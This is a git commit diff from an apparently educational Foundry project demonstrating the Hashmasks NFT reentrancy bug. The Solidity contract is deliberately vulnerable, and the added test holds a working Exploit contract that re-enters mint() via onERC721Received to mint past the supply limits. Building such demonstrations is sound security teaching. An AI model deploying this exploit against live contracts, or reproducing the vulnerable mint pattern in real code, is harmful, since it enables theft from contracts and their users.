eab57cecc8aa44544d04f9a89cedbba69eeba0f7
Vasiliy Yorkin <vasiliy.yorkin@gmail.com>
2023-01-06 01:26:13 +0300

    Dangers of surprising code demo

--- src/Hashmasks.sol
+++ src/Hashmasks.sol
@@ -1,11 +1,18 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.16;
 
+import {Counters} from "openzeppelin/utils/Counters.sol";
 import {ERC721} from "openzeppelin/token/ERC721/ERC721.sol";
 
 contract Hashmasks is ERC721 {
+  using Counters for Counters.Counter;
+
   uint256 constant MAX_NFT_SUPPLY = 40;
   uint256 constant NFT_PRICE = 0.001 ether;
+
+  Counters.Counter public tokenId;
+
+  constructor() ERC721("Hashmasks", "HSH") {}
 
   function mint(uint256 numberOfNfts) public payable {
       require(totalSupply() < MAX_NFT_SUPPLY, "Sale has already ended");
@@ -14,8 +21,13 @@ contract Hashmasks is ERC721 {
       require(numberOfNfts <= 20, "You may not buy more than 20 NFTs at once");
 
       for (uint i = 0; i < numberOfNfts; i++) {
-          uint ix = totalSupply();
+          uint256 ix = totalSupply();
+          tokenId.increment();
           _safeMint(msg.sender, ix);
       }
+  }
+
+  function totalSupply() public view returns (uint256) {
+    return tokenId.current();
   }
 }
--- test/Hashmasks.t.sol
+++ test/Hashmasks.t.sol
@@ -1,14 +1,55 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.16;
 
+import {Ownable} from "openzeppelin/access/Ownable.sol";
+import {IERC721Receiver} from "openzeppelin/token/ERC721/IERC721Receiver.sol";
 import {Test} from "forge-std/Test.sol";
+import {console2} from "forge-std/console2.sol";
 import {Utilities} from "./Utilities.sol";
 import {Hashmasks} from "../src/Hashmasks.sol";
+
+contract Exploit is Ownable {
+    Hashmasks private hashmasks;
+    uint256 private maxCalls;
+    uint256 private callIx;
+
+    constructor(Hashmasks _hashmasks, uint256 _maxCalls) payable {
+      hashmasks = _hashmasks;
+      maxCalls = _maxCalls;
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+
+        if (callIx < maxCalls) {
+          callIx++;
+          hashmasks.mint(20);
+        }
+
+
+        return this.onERC721Received.selector;
+    }
+
+    function run() external onlyOwner {
+      hashmasks.mint{value: 20 * 0.001 ether}(20);
+
+      uint256 count = hashmasks.balanceOf(address(this));
+      console2.log("balanceOf(Exploit))", count);
+
+      // TODO: transfer all minted NTF's to owner
+      selfdestruct(payable(owner()));
+    }
+}
 
 contract HashmasksTest is Test {
     Utilities private utils;
     address payable private attacker;
     Hashmasks private hashmasks;
+    Exploit private exploit;
 
     function setUp() public {
       utils = new Utilities();
@@ -18,9 +59,20 @@ contract HashmasksTest is Test {
       vm.label(attacker, "Attacker");
 
       hashmasks = new Hashmasks();
+
+      vm.prank(attacker);
+      exploit = new Exploit{value: 1 ether}(hashmasks, 1);
     }
 
     function testReentrancy() public {
-        assertTrue(true);
+      vm.startPrank(attacker);
+      exploit.run();
+      vm.stopPrank();
+
+      validate();
+    }
+
+    function validate() private {
+      assertGt(hashmasks.totalSupply(), 20);
     }
 }
